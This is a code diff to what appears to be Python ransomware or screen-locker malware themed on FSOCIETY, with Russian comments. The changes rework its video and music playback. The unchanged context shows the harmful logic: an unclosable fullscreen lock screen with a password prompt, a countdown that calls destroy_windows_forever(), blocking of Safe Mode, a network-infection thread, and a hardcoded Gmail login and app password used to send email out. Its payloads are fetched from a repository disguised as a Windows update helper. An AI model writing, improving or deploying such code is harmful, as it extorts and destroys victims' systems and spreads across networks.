@@ -23,9 +23,12 @@ TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Mic
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
-VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/preview.mp4"
-MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/them%D0%B3.mp3"
+
+# НОВЫЕ ССЫЛКИ
+VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
+MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
 LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/icon.png"
+
 VIDEO_PATH = os.path.join(tempfile.gettempdir(), "preview.mp4")
 MUSIC_PATH = os.path.join(tempfile.gettempdir(), "theme.mp3")
 LOGO_PATH = os.path.join(tempfile.gettempdir(), "icon.png")
@@ -193,16 +196,10 @@ def anim_connect():
         current += line + "\n"; lbl.config(text=current); a.update(); time.sleep(0.4)
     time.sleep(3); a.destroy()
 
-def play_video():
-    try:
-        download_file(VIDEO_URL, VIDEO_PATH)
-    except:
-        return
-
+def play_video_with_sound():
+    download_file(VIDEO_URL, VIDEO_PATH)
     if not os.path.exists(VIDEO_PATH) or os.path.getsize(VIDEO_PATH) < 1000:
         return
-
-    time.sleep(0.3)
 
     video_window = tk.Tk()
     video_window.attributes('-fullscreen', True)
@@ -214,68 +211,61 @@ def play_video():
     lbl = tk.Label(video_window, bg='black')
     lbl.pack(expand=True, fill='both')
 
+    stop_video = threading.Event()
+    cap = cv2.VideoCapture(VIDEO_PATH)
+    if not cap.isOpened():
+        video_window.destroy()
+        return
+
+    fps = cap.get(cv2.CAP_PROP_FPS)
+    if fps <= 0: fps = 30
+
+    sw = video_window.winfo_screenwidth()
+    sh = video_window.winfo_screenheight()
+
     try:
         import pygame
         pygame.init()
         pygame.display.set_mode((1, 1), pygame.NOFRAME)
         pygame.mixer.quit()
         pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
+        pygame.mixer.music.load(VIDEO_PATH)
+        pygame.mixer.music.set_volume(1.0)
+        pygame.mixer.music.play()
     except:
         video_window.destroy()
         return
 
-    stop_video = threading.Event()
+    def audio_loop():
+        while not stop_video.is_set():
+            try:
+                if not pygame.mixer.music.get_busy():
+                    pygame.mixer.music.play()
+                time.sleep(0.1)
+            except:
+                break
 
-    def play_audio():
-        try:
-            pygame.mixer.music.load(VIDEO_PATH)
-            pygame.mixer.music.set_volume(1.0)
-            pygame.mixer.music.play()
-            while pygame.mixer.music.get_busy() and not stop_video.is_set():
-                time.sleep(0.05)
-        except:
-            pass
-
-    audio_thread = threading.Thread(target=play_audio, daemon=True)
+    audio_thread = threading.Thread(target=audio_loop, daemon=True)
     audio_thread.start()
-
-    cap = cv2.VideoCapture(VIDEO_PATH)
-    if not cap.isOpened():
-        pygame.mixer.music.stop()
-        video_window.destroy()
-        return
-
-    fps = cap.get(cv2.CAP_PROP_FPS)
-    if fps <= 0:
-        fps = 30
-
-    sw = video_window.winfo_screenwidth()
-    sh = video_window.winfo_screenheight()
 
     try:
         frame_count = 0
         start_time = time.time()
-
-        while cap.isOpened():
+        while cap.isOpened() and not stop_video.is_set():
             ret, frame = cap.read()
             if not ret:
                 break
-
             frame_count += 1
-
             expected_elapsed = frame_count / fps
             actual_elapsed = time.time() - start_time
             if expected_elapsed > actual_elapsed:
                 time.sleep(expected_elapsed - actual_elapsed)
-
             frame = cv2.resize(frame, (sw, sh))
             frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-
             img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
             lbl.config(image=img)
             lbl.image = img
             video_window.update()
-
     except:
         pass
     finally:
@@ -343,27 +333,8 @@ def send_email(msg, subj=None):
 
 class Updater:
     def __init__(self):
-        self.root = tk.Tk(); self.root.withdraw()
-        self.win = tk.Toplevel(self.root)
-        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
-        self.win.configure(bg='black'); self.win.overrideredirect(True)
-        self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
-        global attempts_left
-        
-        try:
-            download_file(LOGO_URL, LOGO_PATH)
-            if os.path.exists(LOGO_PATH):
-                logo = PhotoImage(file=LOGO_PATH)
-                logo = logo.subsample(4, 4)
-                lbl_logo = tk.Label(self.win, image=logo, bg='black')
-                lbl_logo.image = logo; lbl_logo.place(x=10, y=10)
-        except: pass
-        
-        self.timer_end = get_timer()
-        self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
-        self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
-        self.update_timer()
-        
+        # СНАЧАЛА ВКЛЮЧАЕМ МУЗЫКУ ПОСЛЕ ВИДЕО
+        self.music_playing = False
         try:
             download_file(MUSIC_URL, MUSIC_PATH)
             if os.path.exists(MUSIC_PATH) and os.path.getsize(MUSIC_PATH) > 1000:
@@ -371,9 +342,37 @@ class Updater:
                 pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
                 pygame.mixer.music.load(MUSIC_PATH)
                 pygame.mixer.music.set_volume(1.0)
-                pygame.mixer.music.play(-1)
+                pygame.mixer.music.play(-1)  # бесконечный повтор
+                self.music_playing = True
+        except:
+            pass
+
+        self.root = tk.Tk()
+        self.root.withdraw()
+        self.win = tk.Toplevel(self.root)
+        self.win.attributes('-fullscreen', True)
+        self.win.attributes('-topmost', True)
+        self.win.configure(bg='black')
+        self.win.overrideredirect(True)
+        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
+        self.win.focus_force()
+        global attempts_left
+
+        try:
+            download_file(LOGO_URL, LOGO_PATH)
+            if os.path.exists(LOGO_PATH):
+                logo = PhotoImage(file=LOGO_PATH)
+                logo = logo.subsample(4, 4)
+                lbl_logo = tk.Label(self.win, image=logo, bg='black')
+                lbl_logo.image = logo
+                lbl_logo.place(x=10, y=10)
         except: pass
-        
+
+        self.timer_end = get_timer()
+        self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
+        self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
+        self.update_timer()
+
         msg = f"""Привет друг!
 
 Вот чего доводит интернет.
@@ -393,47 +392,63 @@ FSOCIETY тебя приветствует!
 YOU FUCK.
 
 ПОПЫТОК: {MAX_ATTEMPTS}"""
-        
+
         tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',10,'bold'), justify='center').place(relx=0.5, rely=0.45, anchor='center')
-        
-        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.82, anchor='center')
+
+        cf = tk.Frame(self.win, bg='black')
+        cf.place(relx=0.5, rely=0.82, anchor='center')
         tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
         self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', relief='solid', bd=2)
         self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
         self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier',12,'bold'))
         self.sl.pack()
-        self.pw.bind('<Return>', self.check); self.pw.focus_force()
+        self.pw.bind('<Return>', self.check)
+        self.pw.focus_force()
         self.win.after(100, self._keep)
-    
+
     def update_timer(self):
         remaining = self.timer_end - time.time()
-        if remaining <= 0: destroy_windows_forever()
-        h = int(remaining // 3600); m = int((remaining % 3600) // 60); s = int(remaining % 60)
+        if remaining <= 0:
+            destroy_windows_forever()
+        h = int(remaining // 3600)
+        m = int((remaining % 3600) // 60)
+        s = int(remaining % 60)
         self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
         self.win.after(1000, self.update_timer)
-    
+
     def _keep(self):
-        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
+        try:
+            self.win.focus_force()
+            self.pw.focus_force()
+            self.win.after(100, self._keep)
         except: pass
-    
+
     def check(self, e=None):
         global attempts_left
         if self.pw.get() == KEY:
-            try: pygame.mixer.music.stop()
+            try:
+                pygame.mixer.music.stop()
             except: pass
             unblock_all()
-            self.sl.config(text="ВЕРНО!", fg='white'); self.win.update()
+            self.sl.config(text="ВЕРНО!", fg='white')
+            self.win.update()
             try: os.remove(TIMER_FILE)
             except: pass
-            time.sleep(1); self.root.destroy(); os._exit(0)
+            time.sleep(1)
+            self.root.destroy()
+            os._exit(0)
         else:
             attempts_left -= 1
-            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
+            if attempts_left > 0:
+                self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
             else:
-                try: pygame.mixer.music.stop()
+                try:
+                    pygame.mixer.music.stop()
                 except: pass
-                self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update()
-                time.sleep(2); destroy_windows_forever()
+                self.sl.config(text="404 | ОШИБКА", fg='white')
+                self.win.update()
+                time.sleep(2)
+                destroy_windows_forever()
             self.pw.delete(0, tk.END)
 
 if __name__ == "__main__":
@@ -446,11 +461,11 @@ if __name__ == "__main__":
     block_safe_mode()
     threading.Thread(target=infect_network, daemon=True).start()
     threading.Thread(target=timer_check_loop, daemon=True).start()
-    
+
     anim_fsociety()
     anim_stealer()
     anim_connect()
-    play_video()
+    play_video_with_sound()  # ВИДЕО СО ВСТРОЕННЫМ ЗВУКОМ
     block_everything()
-    Updater()
+    Updater()  # ТУТ УЖЕ ИГРАЕТ МУЗЫКА ПОСЛЕ ВИДЕО
     tk.mainloop()
